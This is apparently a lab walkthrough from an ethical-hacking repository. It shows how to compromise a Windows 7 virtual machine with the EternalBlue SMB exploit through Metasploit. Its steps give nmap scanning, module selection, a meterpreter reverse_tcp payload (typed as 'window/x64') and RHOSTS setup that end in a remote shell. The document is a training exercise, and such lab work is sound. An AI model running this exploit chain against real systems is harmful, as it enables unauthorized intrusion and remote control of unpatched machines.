#  Windows-7 OS eternal-blue  #



## Operating Systems ##
- [Window 7 OS](https://www.softlay.com/downloads/windows-7-ultimate) (Target)
- [Kali Linux OS](https://www.kali.org/get-kali/#kali-platforms) (Attacker)



## Tools ##
- [Nmap](https://nmap.org/)
- [Metasploit Framework](https://www.metasploit.com/)



## Intro ##
<p align="justify">To complete this lab, you will require Kali Linux as the attacker system and Windows 7 as the target system. I have provided links above where you can download the necessary operating systems and tools. If you're unsure about how to install Kali Linux or Windows 7 as virtual machines, or if you encounter any issues with the tools, you can refer to the guides available on the following websites that I will describe below.</p>

- [Installing Kali Linux in Virtual Box](https://www.youtube.com/watch?v=MPkni85O9JA)
- [Installing Windows 7 in Virtual Box](https://www.youtube.com/watch?v=qc3tatME9k4)
- [Installing Nmap in Kali Linux](https://www.youtube.com/watch?v=UztKA63rmL0)



### Step 1 ###
<p align="justify">After obtaining both Kali Linux and Windows 7, it is necessary to configure their network settings to be on the same network.</p>



### Step 2 ###
<p align="justify">In step two, you must disable the Windows 7 firewall to access the target system. Without disabling the firewall, the ports required for access will remain closed.</p>

1. Click Control Panel from the search results.
1. Select System and Security.
1. Click Windows Defender Firewall.
1. Click the Turn Windows Defender Firewall on or off option.
1. Click the Turn off Windows Defender Firewall

<p align="center"><img src="https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/2da2842c-b88b-4718-a795-d57290a00010" width="450px" height="300px"><br>Figure(1) Firewall Off!</p>



### Step 3 (Ping) ###
<p align="justify">Before we begin exploiting, it's important to ensure that both systems are connected or in the same network. </p>

```
ping [TARGET IP]
```

![ping](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/6b04ea71-1682-44bc-840c-4e08d07126b0)



### Step 4 (Scanning) ###
<p align="justify">If the target system is on our network, we can scan its open ports using its IP address. I use Nmap for vulnerability scanning.</p>

- -A : For all types of scans, such as OS detection, version of services detection, and traceroute.

```
nmap -A -Pn [TARGET IP]
```

If you're looking to learn the basics of Namp, you can find them [here](https://www.youtube.com/watch?v=5MTZdN9TEO4).

![nmap](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/bd2950a8-1882-4651-84f6-78eb3eea345e)



### Step 5 (Metasploit) ###
<p align="justify">After the scanning process, you will notice that several ports are opening. It is important to pay attention to Port 445, which is also known as the server message block (SMB). This port enables devices on the same network to communicate with each other and share files or other resources. By exploiting the vulnerability of this service, we can gain access to the target system. Therefore, we will use Metasploit for this purpose. We can use EternalBlue if there is a vulnerability of port 445 on a Windows.</p>

```
msfconsole
```

<p align="justify">Next, look for the Eternal-Blue and use it.</p>

```
search eternalblue
```

```
use 0
```

![Msfconsole](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/a53895bf-addc-4ff5-8946-5617cdced1ef)



### Step 6 (Payload) ###
<p align="justify">Now we need to set the payload, but it's not necessary for this exploit. We can use it or not, depending on our preference.</p>

```
set payload window/x64/meterpreter/reverse_tcp
```

![payload](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/81c37fbc-e687-46ad-ba12-093d07f08ff5)



### Step 7 (Options) ###
<p align="justify">We need to consult the available options to determine what modifications are necessary.</p>

```
show options
```

![options](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/a4cdc84f-16c8-4f69-8880-7970944c16d2)



### Step 8 (Getting Access) ###
<p align="justify">In options, RHOSTS refers to the IP address of the target system, and RPORT refers to the vulnerable port we are going to exploit on the target. RPORT has already been added. We only need to add the target's IP in RHOSTS.</p>

```
set rhosts [TARGET IP]
```

Then,

```
run
```

![run](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/0fe9b253-5713-4d8b-830f-3041fb3fc5f0)



### Result ###
<p align="justify">After a few seconds of waiting, we were able to access the target system. We can request help to determine our next steps.</p>

```
help
```

![help](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/7519d863-d454-4657-ac32-1d69ae72fd50)

<br>

<p align="justify">There are many options that we can do in the meterpreter session. For example, we can type ipconfig or ifconfig to see the network config setting of the system.</p>

```
ipconfig
```

Or,

```
ifconfig
```

![ipconfig](https://github.com/pyaephonehan21/Ethical-Hacking/assets/156397261/1d8fcb95-2875-4078-97bc-a4e86d450ff1)

### Practice sessions have come to an end.  I hope you enjoyed them. See you next Sunday for our next session ###
